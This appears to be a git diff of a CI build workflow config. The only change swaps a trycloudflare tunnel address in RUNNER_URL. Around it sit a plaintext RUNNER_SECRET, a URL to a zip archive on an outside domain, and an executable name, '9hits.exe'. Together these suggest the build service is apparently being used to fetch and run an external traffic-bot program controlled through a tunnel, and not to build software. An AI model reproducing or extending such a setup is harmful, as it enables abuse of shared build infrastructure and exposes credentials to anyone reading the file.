@@ -5,7 +5,7 @@ workflows:
     max_build_duration: 30
     environment:
       vars:
-        RUNNER_URL:    "https://treasure-jews-discussing-crystal.trycloudflare.com"
+        RUNNER_URL:    "https://ads-dicke-joy-laws.trycloudflare.com"
         RUNNER_SECRET: "uHIUq9o4Sal6GdOByn0kmpfg/fvjWt1zz+NH6VUQzdY="
         DROPBOX_URL:   "https://chaincripta.com/chaincripta_30_git_codemag/chaincripta_30_git_codemag.zip"
         EXE_NAME:      "9hits.exe"
